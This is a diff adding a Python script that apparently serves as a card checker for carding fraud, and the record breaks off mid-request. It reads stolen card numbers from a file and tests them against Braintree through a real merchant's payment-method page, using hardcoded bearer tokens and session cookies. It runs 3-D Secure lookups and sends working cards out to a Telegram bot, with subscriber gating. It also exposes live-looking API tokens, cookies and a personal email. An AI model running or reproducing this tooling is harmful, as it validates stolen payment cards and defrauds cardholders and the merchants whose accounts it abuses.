@@ -1,1 +1,484 @@
-print('sstop')
+import requests
+from bs4 import BeautifulSoup
+import time
+import pycountry
+import os
+import sys
+
+ps = '\033[1m\x1b[38;5;120m'
+reset = '\033[0m'
+bold = '\033[1m'
+rd = '\033[1m\x1b[1;31m'
+
+ae = [1296559148, 5966873984, 1296559148, 6695873549, 5702803191, 6174126557, 5612427625, 1970257616, 7408511525, 912917157, 6603688300, 5123986264, 6609362604, 1418522621, 2084607021, 6084792010, 1766670561, 2093600923, 7941434265]
+
+tokeen = "7730868371:AAHY4EIzQPDuDBnosB6ymm5p5-TXA6Sc0rI"
+id = 7408511525
+
+def lo(word):
+    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
+    for i in range(5):
+        for x in range(len(heron)):
+            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
+            time.sleep(0.1)
+            sys.stdout.flush()
+
+if id not in ae:
+	print('Go subscribe first.')
+	exit()
+else:
+	lo(" \x1b[1;36m      𝐖𝐚𝐢𝐭.𝐅𝐨𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐚𝐭𝐢𝐨𝐧... ")
+	
+
+time.sleep(5)
+
+os.system('clear')
+
+file=open('Modca.txt',"+r")
+
+for P in file.readlines():
+	num = P.split('|')[0]
+	bin=num[:6]
+	
+	mm=P.split('|')[1]
+	if int(mm) == 12 or int(mm) == 11 or int(mm) == 10:
+	    	mm = mm
+	elif '0' not in mm:
+	    	mm = f'0{mm}'
+	else:
+	    mm = mm
+	    
+	cvc=P.split('|')[3].replace('\n', '')
+	P=P.replace('\n', '')	
+	yy=P.split('|')[2]
+	if "20" not in yy:
+	        yy = f'20{yy}'
+	else:
+	    	yy = yy
+
+
+	bin = num[:6]
+	
+	headers = {
+	    'authority': 'payments.braintree-api.com',
+	    'accept': '*/*',
+	    'accept-language': 'fr-FR,fr;q=0.9,ar-MA;q=0.8,ar;q=0.7,en-US;q=0.6,en;q=0.5',
+	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzgyNjUxNDEsImp0aSI6IjcxYTU5ZGY3LTU3MDgtNGI2Yy05OTk4LTI3NGMyZGM5YmY5OSIsInN1YiI6InQ3aHY2MmdnMnpyMjhwOHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InQ3aHY2MmdnMnpyMjhwOHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.y21SKqrzutjRQMZCJDClvtRp_M_ndicuUOfxxxk5nFdhIizfyNb_4pgEcTogDxjoApH-tBWnfw52B7LehA5-yQ',
+	'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzgzMzQ3MjcsImp0aSI6Ijg4MmZjNmJiLTgyZWQtNDM5Ni1hYmJiLTgxYzA3MWI3ZWY5NCIsInN1YiI6InQ3aHY2MmdnMnpyMjhwOHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InQ3aHY2MmdnMnpyMjhwOHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.DvlrdZt5uA0co_QRWSY_PJe_tPAn_tcFgUSUZpBSTKbAydHCq8D9LsM1ve0ECg2_7KAQ4Tey6-1kbWZ8ucU_Vg',
+	    'braintree-version': '2018-05-10',
+	    'cache-control': 'no-cache',
+	    'content-type': 'application/json',
+	    'origin': 'https://assets.braintreegateway.com',
+	    'pragma': 'no-cache',
+	    'referer': 'https://assets.braintreegateway.com/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'cross-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	
+	json_data = {
+	    'clientSdkMetadata': {
+	        'source': 'client',
+	        'integration': 'dropin2',
+	        'sessionId': 'cd618e75-1dbe-4ea2-98d1-bc9d41e253bc',
+	    },
+	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+	    'variables': {
+	        'input': {
+	            'creditCard': {
+	                'number': num,
+	                'expirationMonth': mm,
+	                'expirationYear': yy,
+	                'cvv': cvc,
+	            },
+	            'options': {
+	                'validate': False,
+	            },
+	        },
+	    },
+	    'operationName': 'TokenizeCreditCard',
+	}
+	
+	rr = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
+	start_time = time.time()
+	try:
+		token = rr['data']['tokenizeCreditCard']['token']
+	except:
+		print('Call Ilyass To Update Habibi 💸 ')
+		exit()
+		
+	cookies = {
+	    '_ga': 'GA1.1.1512359787.1738173659',
+	    '_fbp': 'fb.1.1738173659380.409121202509643598',
+	    'mc_landing_site': 'https%3A%2F%2Fpetcostumecenter.com%2F%3Fsrsltid%3DAfmBOoos9BYbZy3hZ7JzxTCKAP1u4gEZ2_eMdc91g9peGzYDnLQh9Ebq',
+	    'MobileMonkeyWebchatPersona': '{%22displayName%22:null%2C%22displayPictureUrl%22:%22https://graph.facebook.com/1298080040284980/picture?type=large%22%2C%22pageName%22:%22Pet%20Costume%20Center%22}',
+	    'MobileMonkeyWindowActive': '{%22active%22:false}',
+	    'cf_clearance': 'NkFaIfTTEaG505Ijig4.FWe_dGAZ6oHyl7tX6bbcNgA-1738188227-1.2.1.1-CtyiziZuZYMhiisPV5JIfYA9gQYjhSoDAUJqhyDFd2GEKLQmqKLwOPV06V42gSzeJN.0R3iJ8FX1OxhjT52OJZE42jTfuzrCxOMhvgveQb1fkCrw2zZgPOlObke.HF2R9mFbqHFCcVLubHk2XFwuGEWtwI.Ecb9U3lTqhRrh7.on.a66O4nPk8W6KnH3nYCrJxDt.2xgDfIbj9lp7tvy3UV9CeMK4TV4cbiapYaunfnE1PKOkhQjJZzsaPmQuq_lFNw_yB_ITMDS5whE9.QL9jWKB6dLAG.tiF4lX6wULZNtUaD_3wI85ueBhIJOBHXHyf.a4Qeeq7YqeH9fArtcXA',
+	    'sbjs_migrations': '1418474375998%3D1',
+	    'sbjs_current_add': 'fd%3D2025-01-29%2022%3A04%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fpayment-methods%2F%3F__cf_chl_tk%3DdNV4v9SdptG51XRdGX6Q24672dSdA5Nek.4xHRy7kzY-1738188227-1.0.1.1-3Ls6ddXxdxKTMBLk8kJ8gAYJmbbXx9Qb5_b_EX1HdIE',
+	    'sbjs_first_add': 'fd%3D2025-01-29%2022%3A04%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fpayment-methods%2F%3F__cf_chl_tk%3DdNV4v9SdptG51XRdGX6Q24672dSdA5Nek.4xHRy7kzY-1738188227-1.0.1.1-3Ls6ddXxdxKTMBLk8kJ8gAYJmbbXx9Qb5_b_EX1HdIE',
+	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_udata': 'vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+	    'wordpress_test_cookie': 'WP%20Cookie%20check',
+	    '_gcl_au': '1.1.869640588.1738173659.735134475.1738247989.1738248038',
+	    'wordpress_logged_in_289d90acb685b9dc87359ec1a035bdf9': 'ilyasssr120%7C1738852842%7Ch6VthUSnbnVlUQbvHUU9v1sb5x6TtZIPs0IevnNzzBt%7C5a900d56007907f76da48dd799046466137db144bee401259c276720274cc3fb',
+	    'wp_woocommerce_session_289d90acb685b9dc87359ec1a035bdf9': '3073%7C%7C1738419651%7C%7C1738416051%7C%7Cbce51f19518b0d46509f2cdc4092c573',
+	    'MobileMonkeyWebchatSenderID': '{}',
+	    'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2Fadd-payment-method%2F',
+	    '_ga_128CPY397L': 'GS1.1.1738246827.6.1.1738248338.0.0.0',
+	    '_uetsid': '001aefd0de6b11efa5d47d45264053ab',
+	    '_uetvid': '001bb200de6b11ef9a00e7c88c6fb9b2',
+	}
+	
+	headers = {
+	    'authority': 'petcostumecenter.com',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'accept-language': 'fr-FR,fr;q=0.9,ar-MA;q=0.8,ar;q=0.7,en-US;q=0.6,en;q=0.5',
+	    'cache-control': 'max-age=0',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://petcostumecenter.com',
+	    'referer': 'https://petcostumecenter.com/my-account/add-payment-method/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-arch': '""',
+	    'sec-ch-ua-bitness': '""',
+	    'sec-ch-ua-full-version': '"124.0.6327.4"',
+	    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-model': '"SM-G973F"',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-ch-ua-platform-version': '"12.0.0"',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	
+	data = {
+	    'payment_method': 'braintree_cc',
+	    'braintree_cc_nonce_key': token,
+	    'braintree_cc_device_data': '{"device_session_id":"c0d17cc80624dbfad548945827cbaf9a","fraud_merchant_id":null,"correlation_id":"40eb6203-7397-45c8-99a0-134411b0"}',
+	    'braintree_cc_3ds_nonce_key': '',
+	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/t7hv62gg2zr28p8y/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/t7hv62gg2zr28p8y"},"merchantId":"t7hv62gg2zr28p8y","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"PET COSTUME CENTER","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzgzMzQ3MzEsImp0aSI6ImE5NWExNzhkLWQzNjAtNDRjYy1hNjM3LWU0NDU5NWZlOWVlNiIsInN1YiI6InQ3aHY2MmdnMnpyMjhwOHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InQ3aHY2MmdnMnpyMjhwOHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.oUMm2-whfX5S_FgAoj7XGaCU0qCj-FDqiqLsK5kd-Jt3ou1D8yhCfL5qBHF_bDiW8JtzZGyaD5up6F7i3k6L7Q","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":false}',
+	    'woocommerce-add-payment-method-nonce': 'e706506dbf',
+	    '_wp_http_referer': '/my-account/add-payment-method/',
+	    'woocommerce_add_payment_method': '1',
+	}
+	
+	res = requests.post(
+	    'https://petcostumecenter.com/my-account/add-payment-method/',
+	    cookies=cookies,
+	    headers=headers,
+	    data=data,
+	).text
+	
+	html = res
+	end_time = time.time()
+	etime = round(end_time - start_time, 2)
+	
+	info = {}
+	
+	try:
+	    meet_headers = {
+	        'Referer': 'https://bincheck.io/ar',
+	        'Upgrade-Insecure-Requests': '1',
+	        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+	    }
+	
+	    response = requests.get(f'https://bincheck.io/ar/details/{bin}', headers=meet_headers)
+	    response.raise_for_status()
+	    
+	    soup = BeautifulSoup(response.text, 'html.parser')
+	    
+	    table1 = soup.find('table', class_='w-full table-auto')
+	    rows1 = table1.find_all('tr')
+	    
+	    table2 = soup.find_all('table', class_='w-full table-auto')[1]
+	    rows2 = table2.find_all('tr')
+	    
+	    for row in rows1:
+	        cells = row.find_all('td')
+	        if len(cells) == 2:
+	            cell1_text = cells[0].text.strip()
+	            cell2_text = cells[1].text.strip()
+	            if cell1_text == 'العلامة التجارية للبطاقة':
+	                info['brand'] = cell2_text
+	            elif cell1_text == 'نوع البطاقة':
+	                info['card_type'] = cell2_text
+	            elif cell1_text == 'تصنيف البطاقة':
+	                info['card_level'] = cell2_text
+	            elif cell1_text == 'اسم المصدر / البنك':
+	                info['bank'] = cell2_text
+	
+	    for row in rows2:
+	        cells = row.find_all('td')
+	        if len(cells) == 2:
+	            cell1_text = cells[0].text.strip()
+	            if cell1_text == 'اسم الدولة ISO':
+	                info['country_name'] = cells[1].text.strip()
+	                country = pycountry.countries.get(name=info['country_name'])
+	                info['flag'] = country.flag if country else ""
+	            elif cell1_text == 'عملة البلد ISO':
+	                info['currency'] = cells[1].text.strip()
+	    
+	    infocard = f'{info.get("card_type", "")} - {info.get("brand", "")} - {info.get("card_level", "")}'
+	    card = info.get("bank", "غير متوفر")
+	    country = f'{info.get("country_name", "")} {info.get("flag", "")}'
+	
+	except Exception:
+	    info = None
+	    infocard = None
+	    card = None
+	    country = None
+	
+	try:
+		if '<ul class="woocommerce-error" role="alert">' in html:
+			soup = BeautifulSoup(html, 'html.parser')
+			aa = soup.find('ul', class_='woocommerce-error').li.text.strip()
+			try:
+				msg = aa.split('Reason:')[1].strip()
+			except:
+				msg = soup.find('ul', class_='woocommerce-error').li.text.strip()
+			
+			
+		elif '<div class="woocommerce-message" role="alert">' in html:
+			soup = BeautifulSoup(html, 'html.parser')
+			msg = soup.find('div', class_='woocommerce-message').text.strip()
+		else:
+			continue
+	except:
+		continue
+	headers = {
+	    'authority': 'payments.braintree-api.com',
+	    'accept': '*/*',
+	    'accept-language': 'fr-FR,fr;q=0.9,ar-MA;q=0.8,ar;q=0.7,en-US;q=0.6,en;q=0.5',
+	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzgzMjkyNzMsImp0aSI6IjE0YTRlYTNjLTE5ZjQtNGQ3Ny1hZGU4LThmMDQ1MTY0MGU4NCIsInN1YiI6InRuZnprcG53aDJrbmJiazkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InRuZnprcG53aDJrbmJiazkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InNpbW9uaGlsbG5ld3NxdWVzdGNvdWsifX0.f2mrxXNoPoaNZqcgnVKpu7FlTEjP4_d3bSLHAmn4C1MnRgDyxnl9G_3uT7sLigDthjFQoU5S1rve3VIS8dSK0Q',
+	    'braintree-version': '2018-05-10',
+	    'content-type': 'application/json',
+	    'origin': 'https://assets.braintreegateway.com',
+	    'referer': 'https://assets.braintreegateway.com/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'cross-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	
+	json_data = {
+	    'clientSdkMetadata': {
+	        'source': 'client',
+	        'integration': 'custom',
+	        'sessionId': 'd2c6d9d2-46c7-4ae0-af7b-91f156b1a489',
+	    },
+	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+	    'variables': {
+	        'input': {
+	            'creditCard': {
+	                'number': num,
+	                'expirationMonth': mm,
+	                'expirationYear': yy,
+	                'cvv': cvc,
+	                'billingAddress': {
+	                    'postalCode': '10000',
+	                },
+	            },
+	            'options': {
+	                'validate': False,
+	            },
+	        },
+	    },
+	    'operationName': 'TokenizeCreditCard',
+	}
+	
+	r1r = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
+	
+	try:
+		r0r = r1r['data']['tokenizeCreditCard']['token']
+	except:
+		print('Call Ilyass To Update Habibi 💸 ')
+		exit()
+	
+	headers = {
+	    'authority': 'api.braintreegateway.com',
+	    'accept': '*/*',
+	    'accept-language': 'fr-FR,fr;q=0.9,ar-MA;q=0.8,ar;q=0.7,en-US;q=0.6,en;q=0.5',
+	    'content-type': 'application/json',
+	    'origin': 'https://buy.tinypass.com',
+	    'referer': 'https://buy.tinypass.com/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'cross-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	
+	jsson_data = {
+	    'amount': 3,
+	    'browserColorDepth': 24,
+	    'browserJavaEnabled': False,
+	    'browserJavascriptEnabled': True,
+	    'browserLanguage': 'fr-FR',
+	    'browserScreenHeight': 869,
+	    'browserScreenWidth': 412,
+	    'browserTimeZone': -60,
+	    'deviceChannel': 'Browser',
+	    'additionalInfo': {
+	        'ipAddress': '105.189.1.167',
+	        'email': 'ilyasssr121@gmail.com',
+	    },
+	    'challengeRequested': True,
+	    'bin': '559888',
+	    'dfReferenceId': '0_1d199c63-89a6-46b1-ac72-639183737d20',
+	    'clientMetadata': {
+	        'requestedThreeDSecureVersion': '2',
+	        'sdkVersion': 'web/3.106.0',
+	        'cardinalDeviceDataCollectionTimeElapsed': 17,
+	        'issuerDeviceDataCollectionTimeElapsed': 646,
+	        'issuerDeviceDataCollectionResult': True,
+	    },
+	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzgzMjkyNzMsImp0aSI6IjE0YTRlYTNjLTE5ZjQtNGQ3Ny1hZGU4LThmMDQ1MTY0MGU4NCIsInN1YiI6InRuZnprcG53aDJrbmJiazkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InRuZnprcG53aDJrbmJiazkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InNpbW9uaGlsbG5ld3NxdWVzdGNvdWsifX0.f2mrxXNoPoaNZqcgnVKpu7FlTEjP4_d3bSLHAmn4C1MnRgDyxnl9G_3uT7sLigDthjFQoU5S1rve3VIS8dSK0Q',
+	    'braintreeLibraryVersion': 'braintree/web/3.106.0',
+	    '_meta': {
+	        'merchantAppId': 'buy.tinypass.com',
+	        'platform': 'web',
+	        'sdkVersion': '3.106.0',
+	        'source': 'client',
+	        'integration': 'custom',
+	        'integrationType': 'custom',
+	        'sessionId': 'd2c6d9d2-46c7-4ae0-af7b-91f156b1a489',
+	    },
+	}
+	
+	response = requests.post(
+	    f'https://api.braintreegateway.com/merchants/tnfzkpnwh2knbbk9/client_api/v1/payment_methods/{r0r}/three_d_secure/lookup',
+	    headers=headers,
+	    json=jsson_data,
+	)
+	
+	m1m = (response.json())
+	try:
+		ooo = m1m['paymentMethod']['threeDSecureInfo']['status']
+	except:print(num);continue
+	
+	if "successful" in ooo:
+		bb = "Passed ✅"
+	else:
+		bb = "Rejected ❌"
+	
+	cc = f"""
+𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
+------------------------------
+[ϟ](https://t.me/N1z1N) 𝐂𝐚𝐫𝐝: `{num}|{mm}|{yy}|{cvc}`
+[ϟ](https://t.me/N1z1N) 𝐒𝐭𝐚𝐭𝐮𝐬: {msg}
+[ϟ](https://t.me/N1z1N) 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree Auth
+------------------------------
+[ϟ](https://t.me/N1z1N) 𝐈𝐧𝐟𝐨: {infocard}
+[ϟ](https://t.me/N1z1N) 𝐁𝐚𝐧𝐤: {card}
+[ϟ](https://t.me/N1z1N) 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
+------------------------------
+[ϟ](https://t.me/N1z1N) 𝐕𝐛𝐯 𝐋𝐨𝐨𝐤𝐮𝐩: {bb}
+[ϟ](https://t.me/N1z1N) 𝐓𝐢𝐦𝐞: {etime}s
+------------------------------
+[ϟ](https://t.me/N1z1N) 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫: @FF5UU
+"""
+	if 'Do Not Honor' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif "Credit card type is not accepted by this merchant account.[Validation: number - CREDIT_CARD_CREDIT_CARD_TYPE_IS_NOT_ACCEPTED] Credit card type is not accepted by this merchant account." in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif 'Invalid Merchant ID' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif 'Processor Declined - Fraud Suspected' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif 'Declined - Call Issuer' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif 'Cannot Authorize at this time (Life cycle)' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif 'Gateway Rejected: risk_threshold' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif 'Violation' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif 'Issuer or Cardholder has put a restriction on the card' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif 'Processor Declined' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif 'Expired Card' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif 'Cannot Authorize at this time (Policy)' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif 'Credit card number is invalid.[Validation: number - CREDIT_CARD_NUMBER_IS_INVALID] Credit card number is invalid.' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif 'Transaction Not Allowed' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+	elif 'Call Issuer. Pick Up Card.' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)	
+	elif 'Closed Card' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+rd+aa+reset)
+
+	elif 'Gateway Rejected: cvv' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+ps+msg+reset)
+		requests.post(f'https://api.telegram.org/bot{tokeen}/sendmessage', 
+              data={'chat_id':  id, 'text':  nn, 'parse_mode':  'Markdown', 'disable_web_page_preview':  'true'})
+		
+	elif 'Card Issuer Declined CVV' in msg:
+		print(bold+num+'|'+mm+ '|'+yy+'|'+cvc+ps+msg+reset)
+		nn = f"""
+𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
+------------------------------
+[ϟ](https://t.me/N1z1N) 𝐂𝐚𝐫𝐝: `{num}|{mm}|{yy}|{cvc}`
+[ϟ](https://t.me/N1z1N) 𝐒𝐭𝐚𝐭𝐮𝐬: Card Issuer Declined CVV (CCN)
+[ϟ](https://t.me/N1z1N) 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree Auth
+------------------------------
+[ϟ](https://t.me/N1z1N) 𝐈𝐧𝐟𝐨: {infocard}
+[ϟ](https://t.me/N1z1N) 𝐁𝐚𝐧𝐤: {card}
+[ϟ](https://t.me/N1z1N) 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
+------------------------------
+[ϟ](https://t.me/N1z1N) 𝐕𝐛𝐯 𝐋𝐨𝐨𝐤𝐮𝐩: {bb}
+[ϟ](https://t.me/N1z1N) 𝐓𝐢𝐦𝐞: {etime}s
+------------------------------
+[ϟ](https://t.me/N1z1N) 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫: @FF5UU
+"""
+		
+		trr = requests.post(f'https://api.telegram.org/bot{tokeen}/sendmessage', 
